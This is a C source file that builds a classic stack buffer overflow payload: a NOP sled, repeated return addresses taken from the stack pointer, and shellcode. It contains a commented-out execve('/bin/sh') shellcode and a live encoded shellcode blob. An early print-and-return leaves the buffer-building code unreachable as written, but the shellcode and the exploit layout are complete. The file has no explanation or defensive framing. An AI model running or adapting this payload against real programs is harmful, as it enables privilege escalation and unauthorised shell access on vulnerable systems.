#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define NOP                            0x90
/*
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

*/
char shellcode[] = "\x29\xc9\x83\xe9\xe9\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xfd"
"\x96\x34\xe4\x83\xeb\xfc\xe2\xf4\xcc\x5f\xbd\x2f\x97\xd0\x6c\x29"
"\x7d\xfc\x31\xbc\xcc\x5f\x65\x8c\x8e\xe5\x43\x80\x95\xb9\x1b\x94"
"\x9c\xfe\x1b\x81\x89\xf5\xbd\x07\xbc\x23\x30\x29\x7d\x05\xdc\xc6"
"\xfd\x96\x34\x90\xcd\xa6\x46\xde\xbc\xd7\x6d\xaf\xaa\xc0\x5e\xb6"
"\xb1\xa0\x5e\x8f\xb4\xac\x04\xde\xcd\xac\x0e\xcb\xc7\xb9\x56\x8d"
"\x93\xb9\x47\x8c\xf7\xcf\xbf\xb5\x01\xfc\x30\xbc\x30\x16\x5e\xe5"
"\xa5\x5b\xb4\xe4";
unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  printf("%s",shellcode);
  return;
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;
 //printf("%d\n", sizeof(shellcode));
  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
//  printf("Using address: 0x%x\n", addr);
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i++)
    buff[i] = NOP;
  for (i = 0; i < 117; i+=4)
    *(addr_ptr++) = addr;
  ptr = buff + bsize - sizeof(shellcode) -1 ;
  for (i =0; i < sizeof(shellcode); i++)
    *(ptr++) = shellcode[i];
  buff[bsize - 1] = '\0';
  printf("%s",buff);
}
